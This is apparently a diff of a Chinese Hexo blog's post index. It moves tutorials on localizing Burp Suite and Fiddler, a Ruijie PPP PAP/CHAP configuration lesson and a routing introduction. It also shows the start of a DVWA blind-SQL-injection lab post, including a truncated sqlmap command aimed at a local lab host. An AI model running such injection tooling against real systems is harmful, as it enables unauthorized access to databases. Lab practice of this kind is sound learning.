+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105115.png" alt="0.5" loading="lazy"></p>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
+<li>.双击下载的文件，选择安装路径（例如我的安装位置是：D:\jdk）</li>
+</ol>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105117.png" alt="1.1" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105119.png" alt="1" loading="lazy"></p>
+<ol start="2">
+<li>配置环境变量（设置–系统–关于–高级系统设置–环境变量）</li>
+</ol>
+<p>在系统环境变量中添加新的环境变量	<code>JAVA_HOME</code>		<code>D:\jdk</code></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105120.png" alt="2" loading="lazy"></p>
+<p>在系统环境变量中<code>Path</code>中添加:<code>%JAVA_HOME%\bin</code></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105122.png" alt="3" loading="lazy"></p>
+<ol start="3">
+<li><p>验证是否安装成功</p>
+<pre class="language-none"><code class="language-none">jave -version</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105123.png" alt="4" loading="lazy"></p>
+</li>
+<li><p>burp安装</p>
+</li>
+</ol>
+<p>双击下载的exe可执行文件，选择安装路径。（D:\BurpSuiteCommunity）</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105125.png" alt="5.5" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105126.png" alt="5" loading="lazy"></p>
+<ol start="5">
+<li>汉化</li>
+</ol>
+<p>把下载的汉化工具移动到burp安装的路径下。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105128.png" alt="6" loading="lazy"></p>
+<p>双击汉化工具，勾选<code>cn</code>后点击<code>run</code>即可</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105129.png" alt="7" loading="lazy"></p>
+<p>成功（虽然不是所有汉化，也够用了）</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602185201.png" alt="8" loading="lazy"></p>
+<ol start="6">
+<li>添加快捷方式（每次进目录点汉化工具太麻烦了）</li>
+</ol>
+<p>右键汉化工具-发送到-桌面桌面快捷方式</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105131.png" alt="9" loading="lazy"></p>
+<p>发送到桌面的快捷方式看起来很不合适，可以对该快捷方式右键属性更改图标</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105132.png" alt="10" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105134.png" alt="11" loading="lazy"></p>
+<p>搞定</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105136.png" alt="12" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>工具汉化</category>
+      </categories>
+      <tags>
+        <tag>汉化</tag>
+        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
@@ -4638,68 +4407,6 @@ Ruijie#terminal monitor </code></pre>
       </categories>
       <tags>
         <tag>锐捷</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Suite汉化教程</title>
-    <url>/posts/d334592a/</url>
-    <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>下载所需安装包</p>
-<p>Burp Suite官网：<a href="https://portswigger.net/burp">https://portswigger.net/burp</a></p>
-<p>java环境（推荐下载11.0.1）：<a href="https://repo.huaweicloud.com/java/jdk/">https://repo.huaweicloud.com/java/jdk/</a></p>
-<p>汉化补丁（百度网盘含Java环境）：<a href="https://pan.baidu.com/s/1m_7QAVbN9QCvQV9xMh3avg?pwd=2yfo">https://pan.baidu.com/s/1m_7QAVbN9QCvQV9xMh3avg?pwd=2yfo</a> 	</p>
-<p>提取码：2yfo</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105115.png" alt="0.5" loading="lazy"></p>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
-<li>.双击下载的文件，选择安装路径（例如我的安装位置是：D:\jdk）</li>
-</ol>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105117.png" alt="1.1" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105119.png" alt="1" loading="lazy"></p>
-<ol start="2">
-<li>配置环境变量（设置–系统–关于–高级系统设置–环境变量）</li>
-</ol>
-<p>在系统环境变量中添加新的环境变量	<code>JAVA_HOME</code>		<code>D:\jdk</code></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105120.png" alt="2" loading="lazy"></p>
-<p>在系统环境变量中<code>Path</code>中添加:<code>%JAVA_HOME%\bin</code></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105122.png" alt="3" loading="lazy"></p>
-<ol start="3">
-<li><p>验证是否安装成功</p>
-<pre class="language-none"><code class="language-none">jave -version</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105123.png" alt="4" loading="lazy"></p>
-</li>
-<li><p>burp安装</p>
-</li>
-</ol>
-<p>双击下载的exe可执行文件，选择安装路径。（D:\BurpSuiteCommunity）</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105125.png" alt="5.5" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105126.png" alt="5" loading="lazy"></p>
-<ol start="5">
-<li>汉化</li>
-</ol>
-<p>把下载的汉化工具移动到burp安装的路径下。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105128.png" alt="6" loading="lazy"></p>
-<p>双击汉化工具，勾选<code>cn</code>后点击<code>run</code>即可</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105129.png" alt="7" loading="lazy"></p>
-<p>成功（虽然不是所有汉化，也够用了）</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602185201.png" alt="8" loading="lazy"></p>
-<ol start="6">
-<li>添加快捷方式（每次进目录点汉化工具太麻烦了）</li>
-</ol>
-<p>右键汉化工具-发送到-桌面桌面快捷方式</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105131.png" alt="9" loading="lazy"></p>
-<p>发送到桌面的快捷方式看起来很不合适，可以对该快捷方式右键属性更改图标</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105132.png" alt="10" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105134.png" alt="11" loading="lazy"></p>
-<p>搞定</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220528105136.png" alt="12" loading="lazy"></p>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>工具汉化</category>
-      </categories>
-      <tags>
-        <tag>汉化</tag>
-        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
@@ -6411,6 +6118,22 @@ PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;php&#x2F;bin环境变量生效 source 
       </tags>
   </entry>
   <entry>
+    <title>fiddler汉化</title>
+    <url>/posts/29ab9ab2/</url>
+    <content><![CDATA[<p>fiddler及汉化补丁下载链接：<a href="https://pan.baidu.com/s/17qtgvvG8wjtcbAUdR4gJsw?pwd=9f3w">https://pan.baidu.com/s/17qtgvvG8wjtcbAUdR4gJsw?pwd=9f3w</a><br>提取码：9f3w</p>
+<p>fiddler官网：<a href="https://www.telerik.com/fiddler">https://www.telerik.com/fiddler</a></p>
+<p>汉化过程：<br>1.安装Fiddler，比如我的Fiddler安装在：D:\Programs\Fiddler<br>2.将FiddlerTexts.txt复制到D:\Programs\Fiddler<br>3.将FdToChinese.dll复制到D:\Programs\Fiddler\Scripts<br>4.重启Fiddler，菜单栏常用功能菜单已被汉化</p>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>工具汉化</category>
+      </categories>
+      <tags>
+        <tag>汉化</tag>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>dvwa--盲注</title>
     <url>/posts/75e4ecec/</url>
     <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p>
@@ -6641,22 +6364,6 @@ sqlmap -u &quot;192.168.224.135&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli_blind&#
       </tags>
   </entry>
   <entry>
-    <title>fiddler汉化</title>
-    <url>/posts/29ab9ab2/</url>
-    <content><![CDATA[<p>fiddler及汉化补丁下载链接：<a href="https://pan.baidu.com/s/17qtgvvG8wjtcbAUdR4gJsw?pwd=9f3w">https://pan.baidu.com/s/17qtgvvG8wjtcbAUdR4gJsw?pwd=9f3w</a><br>提取码：9f3w</p>
-<p>fiddler官网：<a href="https://www.telerik.com/fiddler">https://www.telerik.com/fiddler</a></p>
-<p>汉化过程：<br>1.安装Fiddler，比如我的Fiddler安装在：D:\Programs\Fiddler<br>2.将FiddlerTexts.txt复制到D:\Programs\Fiddler<br>3.将FdToChinese.dll复制到D:\Programs\Fiddler\Scripts<br>4.重启Fiddler，菜单栏常用功能菜单已被汉化</p>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>工具汉化</category>
-      </categories>
-      <tags>
-        <tag>汉化</tag>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hello World</title>
     <url>/posts/4a17b156/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -6771,6 +6478,299 @@ SITE_URL: 网站地址，用于在消息中显示。</code></pre>
       </categories>
       <tags>
         <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PPP协议原理与配置</title>
+    <url>/posts/cea6a88e/</url>
+    <content><![CDATA[<div class="danger">
+
+<blockquote>
+<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
+</blockquote>
+</div>
+
+
+
+
+
+
+
+<h2 id="PPP协议简介"><a href="#PPP协议简介" class="headerlink" title="PPP协议简介"></a>PPP协议简介</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul>
+<li>点对点协议（Point to Point Protocol，PPP）为在点对点连接上传输多协议数据包提供了一个标准方法。</li>
+<li>PPP 最初设计是为两个对等节点之间的 IP 流量传输提供一种封装协议。</li>
+</ul>
+<h3 id="PPP协议简介-1"><a href="#PPP协议简介-1" class="headerlink" title="PPP协议简介"></a>PPP协议简介</h3><ul>
+<li>广域网中的PPP协议： <ul>
+<li>通常使用在专线的点对点线路中，不需要使用MAC地址（MAC地址是以太网的内容） </li>
+<li>PPP与以太网一样工作在OSI模型的数据链路层，使用PPP协议封装数据</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162312.png" alt="1" loading="lazy"></p>
+<h3 id="PPP协议层次介绍"><a href="#PPP协议层次介绍" class="headerlink" title="PPP协议层次介绍"></a>PPP协议层次介绍</h3><ul>
+<li>PPP协议层介绍：<ul>
+<li>PPP协议包含两个子协议：链路层控制协议LCP、网络层控制协议NCP </li>
+<li>PPP协议的NCP部分上跨到了OSI参考模型的第三层，因此PPP还具有部分网络层的功能</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162314.png" alt="2" loading="lazy"></p>
+<h2 id="PPP协议工作原理"><a href="#PPP协议工作原理" class="headerlink" title="PPP协议工作原理"></a>PPP协议工作原理</h2><ul>
+<li>PPP会话建立：<ul>
+<li>LCP链路建立协商阶段</li>
+<li>认证阶段（可选）：PAP和CHAP两种认证方式 </li>
+<li>NCP网络层协议协商阶段</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162319.png" alt="3" loading="lazy"></p>
+<h3 id="PPP会话建立协商过程"><a href="#PPP会话建立协商过程" class="headerlink" title="PPP会话建立协商过程"></a>PPP会话建立协商过程</h3><ul>
+<li>阶段1：LCP协商阶段</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162324.png" alt="4" loading="lazy"></p>
+<ul>
+<li>阶段2：身份认证阶段（可选）</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162328.png" alt="5" loading="lazy"></p>
+<ul>
+<li>阶段3：IPCP协商阶段</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162332.png" alt="6" loading="lazy"></p>
+<h3 id="课程小结"><a href="#课程小结" class="headerlink" title="课程小结"></a>课程小结</h3><ul>
+<li>PPP协议通常工作在广域网的点对点链路中，PPP的通信无需MAC地址 </li>
+<li>PPP工作在OSI参考模型中的数据链路层，包含2个子协议，分别是LCP和NCP</li>
+<li>PPP会话建立有三个阶段，分别是LCP协商阶段、身份认证阶段（可选）、NCP协商阶段</li>
+</ul>
+<h2 id="PPP协议基础配置"><a href="#PPP协议基础配置" class="headerlink" title="PPP协议基础配置"></a>PPP协议基础配置</h2><h3 id="PPP基础命令"><a href="#PPP基础命令" class="headerlink" title="PPP基础命令"></a>PPP基础命令</h3><ul>
+<li>双方接口封装PPP</li>
+</ul>
+<pre class="language-none"><code class="language-none">Router(config-if)# encapsulation ppp</code></pre>
+
+<ul>
+<li>认证方配置对端的用户名和密码</li>
+</ul>
+<pre class="language-none"><code class="language-none">Router(config)# username name password password</code></pre>
+
+<ul>
+<li>认证方配置PPP认证方式（启用PAP或者CHAP认证）</li>
+</ul>
+<pre class="language-none"><code class="language-none">Router(config-if)# ppp authentication &#123;chap | chap pap | pap chap | pap&#125;</code></pre>
+
+<h3 id="PPP典型配置案例（PAP单向认证）"><a href="#PPP典型配置案例（PAP单向认证）" class="headerlink" title="PPP典型配置案例（PAP单向认证）"></a>PPP典型配置案例（PAP单向认证）</h3><ul>
+<li>ppp authentication pap命令指定本地为验证方，验证方需要配置被验证方的用户名密码列表。</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162337.png" alt="7" loading="lazy"></p>
+<ul>
+<li>PAP认证，接口状态验证</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162342.png" alt="8" loading="lazy"></p>
+<h3 id="PPP典型配置案例（PAP双向认证）"><a href="#PPP典型配置案例（PAP双向认证）" class="headerlink" title="PPP典型配置案例（PAP双向认证）"></a>PPP典型配置案例（PAP双向认证）</h3><ul>
+<li>ppp authentication pap命令指定本地为验证方，验证方需要配置被验证方的用户名密码列表。</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162347.png" alt="9" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">username ruijie2 password 0 ruijie2
+interface Serial1&#x2F;0
+ip address 1.1.1.1 255.255.255.0
+encapsulation ppp
+ppp authentication pap
+ppp pap sent-username ruijie1 password 0 ruijie1</code></pre>
+
+<pre class="language-none"><code class="language-none">username ruijie1 password 0 ruijie1
+interface Serial2&#x2F;0
+encapsulation ppp
+ppp authentication pap
+ip address 1.1.1.2 255.255.255.0
+ppp pap sent-username ruijie2 password 0 ruijie2</code></pre>
+
+
+
+<ul>
+<li>接口状态信息验证</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162351.png" alt="10" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">R1#show interface serial 1&#x2F;0
+Index(dec):35 (hex):23
+Serial 1&#x2F;0 is UP , line protocol is UP
+Hardware is Serial
+Interface address is: 1.1.1.1&#x2F;24
+MTU 1500 bytes, BW 2000 Kbit
+Encapsulation protocol is PPP, loopback not set
+Keepalive interval is 10 sec ,retries 10.
+Carrier delay is 2 sec
+Rxload is 1&#x2F;255, Txload is 1&#x2F;255
+LCP Open
+Queueing strategy: FIFO
+Output queue 0&#x2F;40, 0 drops;
+Input queue 0&#x2F;75, 0 drops
+5 minutes input rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
+5 minutes output rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
+38021 packets input, 5656110 bytes, 0 no buffer, 0 dropped
+Received 23488 broadcasts, 0 runts, 0 giants
+0 input errors, 0 CRC, 0 frame, 0 overrun, 0 abort
+38097packets output, 2135697bytes, 0 underruns , 0 dropped</code></pre>
+
+<pre class="language-none"><code class="language-none">R1#show interface serial 2&#x2F;0
+Index(dec):35 (hex):23
+Serial 2&#x2F;0 is UP , line protocol is UP
+Hardware is Serial
+Interface address is: 1.1.1.2&#x2F;24
+MTU 1500 bytes, BW 2000 Kbit
+Encapsulation protocol is PPP, loopback not set
+Keepalive interval is 10 sec ,retries 10.
+Carrier delay is 2 sec
+Rxload is 1&#x2F;255, Txload is 1&#x2F;255
+LCP Open
+Queueing strategy: FIFO
+Output queue 0&#x2F;40, 0 drops;
+Input queue 0&#x2F;75, 0 drops
+5 minutes input rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
+5 minutes output rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
+38325 packets input, 5655320 bytes, 0 no buffer, 0 dropped
+Received 23358 broadcasts, 0 runts, 0 giants
+0 input errors, 0 CRC, 0 frame, 0 overrun, 0 abort
+38235packets output, 2135895bytes, 0 underruns , 0 dropped</code></pre>
+
+<h3 id="PPP典型配置案例（CHAP单向认证）"><a href="#PPP典型配置案例（CHAP单向认证）" class="headerlink" title="PPP典型配置案例（CHAP单向认证）"></a>PPP典型配置案例（CHAP单向认证）</h3><ul>
+<li>ppp authentication chap命令指定本地为验证方，验证方需要配置被验证方的用户名密码列表。</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162356.png" alt="11" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">interface Serial1&#x2F;0
+ip address 1.1.1.1 255.255.255.0
+encapsulation ppp
+ppp chap hostname ruijie1
+ppp chap password 0 ruijie1</code></pre>
+
+<pre class="language-none"><code class="language-none">username ruijie1 password 0 ruijie1
+interface Serial2&#x2F;0
+encapsulation ppp
+ip address 1.1.1.2 255.255.255.0
+ppp authentication chap</code></pre>
+
+
+
+
+
+<ul>
+<li>接口状态信息验证</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162401.png" alt="12" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">R1#show interface serial 1&#x2F;0
+Index(dec):35 (hex):23
+Serial 1&#x2F;0 is UP , line protocol is UP
+Hardware is Serial
+Interface address is: 1.1.1.1&#x2F;24
+MTU 1500 bytes, BW 2000 Kbit
+Encapsulation protocol is PPP, loopback not set
+Keepalive interval is 10 sec ,retries 10.
+Carrier delay is 2 sec
+Rxload is 1&#x2F;255, Txload is 1&#x2F;255
+LCP Open
+Queueing strategy: FIFO
+Output queue 0&#x2F;40, 0 drops;
+Input queue 0&#x2F;75, 0 drops
+5 minutes input rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
+5 minutes output rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
+38021 packets input, 5656110 bytes, 0 no buffer, 0 dropped
+Received 23488 broadcasts, 0 runts, 0 giants
+0 input errors, 0 CRC, 0 frame, 0 overrun, 0 abort
+38097packets output, 2135697bytes, 0 underruns , 0 dropped</code></pre>
+
+<pre class="language-none"><code class="language-none">R1#show interface serial 2&#x2F;0
+Index(dec):35 (hex):23
+Serial 2&#x2F;0 is UP , line protocol is UP
+Hardware is Serial
+Interface address is: 1.1.1.2&#x2F;24
+MTU 1500 bytes, BW 2000 Kbit
+Encapsulation protocol is PPP, loopback not set
+Keepalive interval is 10 sec ,retries 10.
+Carrier delay is 2 sec
+Rxload is 1&#x2F;255, Txload is 1&#x2F;255
+LCP Open
+Queueing strategy: FIFO
+Output queue 0&#x2F;40, 0 drops;
+Input queue 0&#x2F;75, 0 drops
+5 minutes input rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
+5 minutes output rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
+38325 packets input, 5655320 bytes, 0 no buffer, 0 dropped
+Received 23358 broadcasts, 0 runts, 0 giants
+0 input errors, 0 CRC, 0 frame, 0 overrun, 0 abort
+38235packets output, 2135895bytes, 0 underruns , 0 dropped</code></pre>
+
+<h3 id="PPP典型配置案例（CHAP双向认证）"><a href="#PPP典型配置案例（CHAP双向认证）" class="headerlink" title="PPP典型配置案例（CHAP双向认证）"></a>PPP典型配置案例（CHAP双向认证）</h3><ul>
+<li>ppp authentication chap命令指定本地为验证方，验证方需要配置被验证方的用户名密码列表。</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162408.png" alt="13" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">username ruijie2 password 0 ruijie2
+interface Serial1&#x2F;0
+ip address 1.1.1.1 255.255.255.0
+encapsulation ppp
+ppp authentication chap
+ppp chap hostname ruijie1
+ppp chap password 0 ruijie1</code></pre>
+
+
+
+<pre class="language-none"><code class="language-none">username ruijie1 password 0 ruijie1
+interface Serial2&#x2F;0
+ip address 1.1.1.2 255.255.255.0
+encapsulation ppp
+ppp authentication chap
+ppp chap hostname ruijie2
+ppp chap password 0 ruijie2</code></pre>
+
+<ul>
+<li>接口状态信息验证</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162411.png" alt="14" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">R1#show interface serial 1&#x2F;0
+Index(dec):35 (hex):23
+Serial 1&#x2F;0 is UP , line protocol is UP
+Hardware is Serial
+Interface address is: 1.1.1.1&#x2F;24
+MTU 1500 bytes, BW 2000 Kbit
+Encapsulation protocol is PPP, loopback not set
+Keepalive interval is 10 sec ,retries 10.
+Carrier delay is 2 sec
+Rxload is 1&#x2F;255, Txload is 1&#x2F;255
+LCP Open
+Queueing strategy: FIFO
+Output queue 0&#x2F;40, 0 drops;
+Input queue 0&#x2F;75, 0 drops
+5 minutes input rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
+5 minutes output rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
+38021 packets input, 5656110 bytes, 0 no buffer, 0 dropped
+Received 23488 broadcasts, 0 runts, 0 giants
+0 input errors, 0 CRC, 0 frame, 0 overrun, 0 abort
+38097packets output, 2135697bytes, 0 underruns , 0 dropped</code></pre>
+
+<pre class="language-none"><code class="language-none">R1#show interface serial 2&#x2F;0
+Index(dec):35 (hex):23
+Serial 2&#x2F;0 is UP , line protocol is UP
+Hardware is Serial
+Interface address is: 1.1.1.2&#x2F;24
+MTU 1500 bytes, BW 2000 Kbit
+Encapsulation protocol is PPP, loopback not set
+Keepalive interval is 10 sec ,retries 10.
+Carrier delay is 2 sec
+Rxload is 1&#x2F;255, Txload is 1&#x2F;255
+LCP Open
+Queueing strategy: FIFO
+Output queue 0&#x2F;40, 0 drops;
+Input queue 0&#x2F;75, 0 drops
+5 minutes input rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
+5 minutes output rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
+38325 packets input, 5655320 bytes, 0 no buffer, 0 dropped
+Received 23358 broadcasts, 0 runts, 0 giants
+0 input errors, 0 CRC, 0 frame, 0 overrun, 0 abort
+38235packets output, 2135895bytes, 0 underruns , 0 dropped</code></pre>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>锐捷</category>
+      </categories>
+      <tags>
+        <tag>锐捷</tag>
       </tags>
   </entry>
   <entry>
@@ -7092,7 +7092,7 @@ apt-get dist-upgrade		#根据依赖关系更新</code></pre>
     <title>《天堂旅行团》摘抄</title>
     <url>/posts/7d0fc3d8/</url>
     <content><![CDATA[
-    <div id="aplayer-sGXePnvf" class="aplayer aplayer-tag-marker meting-tag-marker"
+    <div id="aplayer-uihruOgz" class="aplayer aplayer-tag-marker meting-tag-marker"
          data-id="1891034510" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#C20C0C"
     ></div>
 
@@ -8743,390 +8743,6 @@ Ruijie(config-if-GigabitEthernet 0&#x2F;1)#spanning-tree bpdufilter enable</code
       </tags>
   </entry>
   <entry>
-    <title>路由技术介绍</title>
-    <url>/posts/f2727247/</url>
-    <content><![CDATA[<div class="danger">
-
-<blockquote>
-<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
-</blockquote>
-</div>
-
-<h2 id="路由技术介绍"><a href="#路由技术介绍" class="headerlink" title="路由技术介绍"></a>路由技术介绍</h2><h3 id="为什么需要路由"><a href="#为什么需要路由" class="headerlink" title="为什么需要路由"></a>为什么需要路由</h3><ul>
-<li>PC的网卡在进行发送数据的时候，网络层将检查目的IP与本网卡的IP地址是否处于一个网段<ul>
-<li>如果属于一个网段，则直接用ARP解析目的IP的MAC地址 </li>
-<li>如果不属于一个网段，则用ARP解析网关的MAC地址</li>
-</ul>
-</li>
-<li>二层交换网络（同一广播域&#x2F;VLAN）内，不同网段的主机之间无法直接通信</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104121.png" alt="1" loading="lazy"></p>
-<h3 id="路由的定义"><a href="#路由的定义" class="headerlink" title="路由的定义"></a>路由的定义</h3><ul>
-<li>从一个接口上收到数据包，根据数据包的目的地址进行定向和转发的过程 </li>
-<li>路由器依据路由表选择下一跳地址&#x2F;出接口并转发数据，实现跨IP网段通信</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104128.png" alt="2" loading="lazy"></p>
-<h4 id="直接路由数据通信分析"><a href="#直接路由数据通信分析" class="headerlink" title="直接路由数据通信分析"></a>直接路由数据通信分析</h4><ul>
-<li>直接路由：同一个IP网络内的通信 </li>
-<li>回想一下：同一个LAN中的PC1和PC2之间的通信过程：PC1&gt;ping 192.168.1.200</li>
-</ul>
-<ol>
-<li>PC1封装一个负载为ICMP Echo的IP报文：源IP&#x3D;192.168.1.100 目的IP&#x3D;192.168.1.200 </li>
-<li>PC1将IP报文封装到以太网帧中，源MAC为本地网卡的MAC，需要确定目的地的MAC </li>
-<li>PC1先判断目标IP是否处于本地子网，结果发现“是” 方式：本地IP与本地掩码是否等于目标IP与本地掩码，如果结果相等，则说明目标IP处于本地子网 </li>
-<li>查本地ARP缓存是否存在目标IP（PC2）对 应的MAC，如果不存在，则通过ARP获取</li>
-<li>成功封装以太网帧，源MAC为PC1的MAC， 目标MAC为PC2的MAC，从PC1网卡发出</li>
-<li>交换机根据MAC地址表转发以太网帧。</li>
-<li>PC2收到以太网帧，解封装出ICMP Echo 需要回复ICMP Reply的IP报文 源IP&#x3D;192.168.1.200 目的IP&#x3D;192.168.1.100</li>
-<li>PC2重复②-⑤的处理流程</li>
-</ol>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104133.png" alt="3" loading="lazy"></p>
-<h3 id="间接路由数据通信分析"><a href="#间接路由数据通信分析" class="headerlink" title="间接路由数据通信分析"></a>间接路由数据通信分析</h3><ul>
-<li>间接路由：不同IP网络内的通信 </li>
-<li>再思考一下：如果PC2与其他LAN中的PC3通信，又该如何：PC2&gt;ping 192.168.2.100</li>
-</ul>
-<p>1、PC2封装一个负载为ICMP Echo的IP报文：源IP&#x3D;192.168.1.200 目的IP&#x3D;192.168.2.100</p>
-<p>2、将IP报文封装到以太网帧中，源MAC为本地网卡的MAC，需要确定目的地的MAC</p>
-<p>3、PC2先判断目标IP是否处于本地子网，结果发现“不是” </p>
-<p>4、PC2如果配置了默认网关，查本地ARP缓存是 否存在网关IP对应的MAC，如果不存在，则通过 ARP获取ARP表项</p>
-<p>5、成功封装以太网帧，源MAC为PC2的MAC， 目标MAC为网关的MAC。由网卡接口发出</p>
-<p>6、交换机根据MAC地址表转发以太网帧，将会发送给网关</p>
-<p>7、网关路由器收到以太网帧，解封装出IP报文。根据报文中的目 标IP信息寻找出接口，在出接口重新封装以太网帧，再发出</p>
